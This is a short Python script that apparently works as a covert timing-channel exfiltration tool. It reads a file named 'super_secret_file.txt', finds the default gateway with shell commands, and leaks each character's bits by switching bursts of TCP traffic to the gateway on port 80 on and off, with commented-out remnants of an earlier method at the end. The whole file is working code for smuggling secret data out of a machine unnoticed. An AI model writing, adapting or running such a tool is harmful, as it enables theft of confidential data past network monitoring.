import socket
import subprocess
import time
import os
secret_file = open("super_secret_file.txt").read()

packet_length = 8

char_time_scale = 5
s = socket.socket(
    socket.AF_INET, socket.SOCK_STREAM)

interface = subprocess.Popen(["ip -o route get 1.1.1.1 | perl -nle 'if(/dev\s+(\S+)/) {print $1}'"], stdout=subprocess.PIPE, shell=True)
p = subprocess.Popen(["ip route show 0.0.0.0/0 dev {}".format(interface.stdout.read())], stdout=subprocess.PIPE, shell=True)
default_gateway = p.stdout.read().split(" ")[2]

print("Default Gateway: ")
print(default_gateway)

s.connect((default_gateway, 80))

def write():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((default_gateway, 80))
    tx_start = time.time()
    print('writing')
    while(abs(time.time()-tx_start) < char_time_scale):
        try:
            s.send('0')
        except:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((default_gateway, 80))

def sleep():
    print("sleeping")
    time.sleep(char_time_scale)

write()
sleep()
write()
sleep()
write()
sleep()
print("done init")
for idx,char in enumerate(secret_file):
    secret_packet = secret_file
    os.system("clear")
    print("Char {} of {}".format(idx,len(secret_file)))
    print("Char: ",char)
    print("Pulsing for ", ord(char))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((default_gateway, 80))
    for i in "{0:b}".format(ord(char)):
        if(i != '0'):
            write()
        sleep()
    print("Done")

# tx_start = time.time()
# while(abs(time.time()-tx_start) < ord(char)*char_time_scale):
#     try:
#         s.send('0')
#     except:
#         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         s.connect((default_gateway, 80))
